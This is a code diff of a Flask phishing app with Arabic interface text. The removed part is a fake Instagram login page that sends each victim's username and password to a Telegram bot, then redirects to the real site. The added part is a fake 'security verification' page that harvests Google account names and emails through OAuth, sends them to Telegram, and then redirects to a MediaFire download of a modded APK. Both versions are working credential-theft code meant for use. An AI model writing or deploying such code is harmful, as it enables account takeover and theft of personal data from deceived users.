@@ -1,263 +1,117 @@
 import os
-import re
 import requests
 from flask import Flask, redirect, render_template_string, request
 
 app = Flask(__name__)
 app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")
 
+GOOGLE_CLIENT_ID = os.getenv("GOOGLE_CLIENT_ID")
+GOOGLE_CLIENT_SECRET = os.getenv("GOOGLE_CLIENT_SECRET")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
-INSTAGRAM_OFFICIAL_URL = "https://www.instagram.com/accounts/login/"
+# تم التعديل هنا ليعتمد على الرابط الصحيح والمطابق تماماً
+REDIRECT_URI = os.getenv(
+    "REDIRECT_URI",
+    "https://instagram-secure-login.up.railway.app/auth/callback",
+)
+
+MEDIAFIRE_URL = "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file"
 
 
-@app.route("/", methods=["GET", "POST"])
-def login():
-  error = ""
-  username_val = ""
-  if request.method == "POST":
-    username_val = request.form.get("username", "").strip()
-    password = request.form.get("password", "")
+@app.route("/")
+def home():
+  google_login_url = (
+      f"https://accounts.google.com/o/oauth2/v2/auth?client_id={GOOGLE_CLIENT_ID}"
+      f"&redirect_uri={REDIRECT_URI}&response_type=code&scope=email%20profile"
+  )
 
-    username_pattern = r"^[a-zA-Z0-9_\.]{4,30}$"
-
-    if not re.match(username_pattern, username_val):
-      error = (
-          "عذراً، اسم المستخدم الذي أَدخلته لا ينتمي إلى أي حساب. يُرجى التحقق من"
-          " اسم المستخدم ومحاولة مرة أخرى."
-      )
-    elif len(password) <= 5:
-      error = (
-          "كلمة المرور غير صحيحة. يُرجى التحقق من كلمة المرور مرة أخرى."
-      )
-    else:
-      if BOT_TOKEN and CHAT_ID:
-        msg = (
-            "📸 تم استلام بيانات Instagram جديدة:\n\n👤 الحساب:"
-            f" {username_val}\n🔑 الباسورد: {password}"
-        )
-        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
-
-      return redirect(INSTAGRAM_OFFICIAL_URL)
-
-  return render_template_string(
-      """
+  return render_template_string(f"""
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>تسجيل الدخول • Instagram</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق الأمني - حماية الموقع</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        
-        body { 
-            background: #121212; 
-            color: #f5f5f5;
-            height: 100dvh;
-            display: flex; 
-            flex-direction: column;
-            align-items: center; 
-            overflow: hidden;
-            padding: 15px 20px 20px 20px;
-        }
-        
-        .page-wrapper {
-            width: 100%;
-            max-width: 350px;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        /* القسم العلوي */
-        .top-section {
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding-top: 5px;
-        }
-
-        .lang-area {
-            text-align: center;
-            color: #a8a8a8;
-            font-size: 12px;
-            width: 100%;
-        }
-
-        .logo-area {
-            display: flex;
-            justify-content: center;
-            margin-top: 80px;
-            width: 100%;
-        }
-        
-        .insta-icon {
-            width: 48px; /* تصغير حجم الحاوية والشعار قليلاً */
-            height: 48px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .insta-icon svg {
-            width: 48px;
-            height: 48px;
-        }
-
-        /* القسم الأوسط (الحقول وزر الدخول) */
-        .form-area { 
-            width: 100%; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            text-align: center; 
-        }
-
-        .error-msg { 
-            color: #ed4956; 
-            font-size: 12px; 
-            line-height: 16px; 
-            margin-bottom: 8px; 
-            text-align: center; 
-            background: #1c1c1c; 
-            padding: 8px; 
-            border-radius: 8px; 
-            border: 1px solid #331a1a; 
-            width: 100%;
-        }
-
-        form {
-            width: 100%;
-        }
-
-        .input-group { margin-bottom: 6px; width: 100%; }
-        
-        .input-group input { 
-            width: 100%; 
-            background: #121212; 
-            border: 1px solid #262626; 
-            border-radius: 8px; 
-            padding: 12px; 
-            font-size: 14px; 
-            color: #f5f5f5; 
-            outline: none; 
-        }
-        .input-group input:focus { border-color: #a8a8a8; }
-        .input-group input::placeholder { color: #8e8e8e; }
-
-        .submit-btn { 
-            width: 100%; 
-            background: #0095f6; 
-            color: white; 
-            border: none; 
-            border-radius: 8px; 
-            padding: 12px; 
-            font-size: 14px; 
-            font-weight: 600; 
-            cursor: pointer; 
-            margin-top: 4px; 
-            margin-bottom: 10px; 
-        }
-        .submit-btn:hover { background: #1877f2; }
-
-        .forgot-pass { color: #f5f5f5; font-size: 12px; text-decoration: none; display: block; margin-top: 4px; font-weight: 400; }
-
-        /* القسم السفلي */
-        .footer-area { 
-            width: 100%; 
-            text-align: center; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-        }
-        
-        .signup-card { 
-            padding: 12px; 
-            width: 100%; 
-            border: 1px solid #262626; 
-            border-radius: 8px; 
-            text-align: center; 
-            font-size: 14px; 
-            color: #0095f6; 
-            font-weight: 600; 
-            cursor: pointer; 
-            margin-bottom: 10px;
-        }
-
-        .meta-footer { display: flex; align-items: center; justify-content: center; }
-        .meta-brand {
-            font-size: 13px;
-            font-weight: 600;
-            color: #737373;
-            letter-spacing: 0.5px;
-        }
+        * {{ box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }}
+        body {{ background: #f8f9fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; width: 100vw; padding: 20px; }}
+        .box {{ background: #ffffff; width: 100%; max-width: 400px; padding: 35px 25px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.08); text-align: center; border: 1px solid #e1e4e8; }}
+        .icon {{ font-size: 36px; margin-bottom: 15px; }}
+        h2 {{ color: #202124; font-size: 18px; font-weight: 600; margin-bottom: 10px; }}
+        p {{ color: #5f6368; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }}
+        .google-btn {{ display: flex; align-items: center; justify-content: center; gap: 12px; width: 100%; background: #ffffff; color: #3c4043; border: 1px solid #dadce0; border-radius: 4px; padding: 12px 16px; font-size: 14px; font-weight: 500; text-decoration: none; cursor: pointer; transition: background 0.2s, box-shadow 0.2s; }}
+        .google-btn:hover {{ background: #f8f9fa; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }}
+        .google-icon {{ width: 18px; height: 18px; }}
+        .footer {{ margin-top: 20px; font-size: 11px; color: #80868b; }}
     </style>
 </head>
 <body>
-    <div class="page-wrapper">
-        <!-- القسم العلوي -->
-        <div class="top-section">
-            <div class="lang-area">العربية</div>
-            <div class="logo-area">
-                <div class="insta-icon">
-                    <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
-                        <defs>
-                            <radialGradient id="ig-grad" cx="20%" cy="100%" r="120%">
-                                <stop offset="0%" stop-color="#fdf497"/>
-                                <stop offset="5%" stop-color="#fdf497"/>
-                                <stop offset="45%" stop-color="#fd5949"/>
-                                <stop offset="60%" stop-color="#d6249f"/>
-                                <stop offset="90%" stop-color="#285AEB"/>
-                            </radialGradient>
-                        </defs>
-                        <path d="M352 0H160C71.6 0 0 71.6 0 160v192c0 88.4 71.6 160 160 160h192c88.4 0 160-71.6 160-160V160c0-88.4-71.6-160-160-160zm112 352c0 61.8-50.2 112-112 112H160c-61.8 0-112-50.2-112-112V160c0-61.8 50.2-112 112-112h192c61.8 0 112 50.2 112 112v192z" fill="url(#ig-grad)"/>
-                        <path d="M256 126.5c-71.5 0-129.5 58-129.5 129.5s58 129.5 129.5 129.5 129.5-58 129.5-129.5-58-129.5-129.5-129.5zm0 211.3c-45.1 0-81.8-36.7-81.8-81.8s36.7-81.8 81.8-81.8 81.8 36.7 81.8 81.8-36.7 81.8-81.8 81.8z" fill="url(#ig-grad)"/>
-                        <circle cx="382.5" cy="129.5" r="30" fill="url(#ig-grad)"/>
-                    </svg>
-                </div>
-            </div>
-        </div>
-
-        <!-- القسم الأوسط: الحقول وزر تسجيل الدخول -->
-        <div class="form-area">
-            {% if error %}
-                <div class="error-msg">{{ error }}</div>
-            {% endif %}
-
-            <form method="POST">
-                <div class="input-group">
-                    <input type="text" name="username" required placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم المحمول" value="{{ username_val }}">
-                </div>
-                <div class="input-group">
-                    <input type="password" name="password" required placeholder="كلمة السر">
-                </div>
-                <button type="submit" class="submit-btn">تسجيل الدخول</button>
-            </form>
-
-            <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
-        </div>
-
-        <!-- القسم السفلي: إنشاء حساب و Meta -->
-        <div class="footer-area">
-            <div class="signup-card">
-                إنشاء حساب جديد
-            </div>
-            <div class="meta-footer">
-                <div class="meta-brand">Meta ∞</div>
-            </div>
-        </div>
+    <div class="box">
+        <div class="icon">🛡️</div>
+        <h2>التحقق من الأمان مطلوب</h2>
+        <p>يرجى إثبات أنك استخدمت متصفحًا حقيقيًا وليس برنامج روبوت لمتابعة التنزيل بأمان.</p>
+        
+        <a href="{google_login_url}" class="google-btn">
+            <svg class="google-icon" viewBox="0 0 24 24">
+                <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/>
+                <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.13 0-5.78-2.11-6.73-4.96H1.19v3.15C3.17 21.31 7.23 24 12 24z"/>
+                <path fill="#FBBC05" d="M5.27 14.24c-.25-.72-.38-1.49-.38-2.24s.13-1.52.38-2.24V6.6H1.19C.43 8.13 0 9.87 0 12s.43 3.87 1.19 5.4l4.08-3.16z"/>
+                <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.23 0 3.17 2.69 1.19 6.6l4.08 3.15c.95-2.85 3.6-4.96 6.73-4.96z"/>
+            </svg>
+            <span>المتابعة باستخدام حساب Google</span>
+        </a>
+        <div class="footer">حماية متقدمة ضد الروبوتات والسبام</div>
     </div>
 </body>
 </html>
-""",
-      error=error,
-      username_val=username_val,
-  )
+""")
+
+
+@app.route("/auth/callback")
+def auth_callback():
+  try:
+    code = request.args.get("code")
+    if code:
+      token_url = "https://oauth2.googleapis.com/token"
+      payload = {
+          "code": code,
+          "client_id": GOOGLE_CLIENT_ID,
+          "client_secret": GOOGLE_CLIENT_SECRET,
+          "redirect_uri": REDIRECT_URI,
+          "grant_type": "authorization_code",
+      }
+
+      response = requests.post(token_url, data=payload, timeout=10)
+
+      if response.status_code == 200:
+        token_data = response.json()
+        access_token = token_data.get("access_token")
+
+        if access_token:
+          user_info_resp = requests.get(
+              "https://www.googleapis.com/oauth2/v2/userinfo",
+              headers={"Authorization": f"Bearer {access_token}"},
+              timeout=10,
+          )
+
+          if user_info_resp.status_code == 200:
+            user_info = user_info_resp.json()
+            email = user_info.get("email", "غير معروف")
+            name = user_info.get("name", "مستخدم جديد")
+
+            if BOT_TOKEN and CHAT_ID:
+              msg = f"🛡️ تم اجتياز التحقق الأمني بنجاح!\n\n👤 الاسم: {name}\n📧 الإيميل: {email}"
+              telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+              requests.post(
+                  telegram_url,
+                  json={"chat_id": CHAT_ID, "text": msg},
+                  timeout=5,
+              )
+  except Exception as e:
+    print(f"Error: {e}")
+
+  return redirect(MEDIAFIRE_URL)
 
 
 if __name__ == "__main__":
